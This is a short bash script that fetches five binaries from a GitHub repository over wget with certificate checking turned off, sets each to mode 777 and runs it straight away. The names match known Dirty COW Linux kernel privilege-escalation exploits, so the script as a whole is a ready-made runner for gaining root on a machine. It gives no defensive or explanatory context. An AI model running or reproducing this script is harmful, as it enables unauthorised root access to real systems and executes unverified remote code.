#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/dirty_passwd_adjust_cow -O dirty_passwd_adjust_cow
chmod 777 dirty_passwd_adjust_cow
./dirty_passwd_adjust_cow

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/c0w -O c0w
chmod 777 c0w
./c0w

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/naughtyc0w -O naughtyc0w
chmod 777 naughtyc0w
./naughtyc0w

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/dirtycow-mem -O dirtycow-mem
chmod 777 dirtycow-mem
./dirtycow-mem

wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/cowroot -O cowroot
chmod 777 cowroot
./cowroot
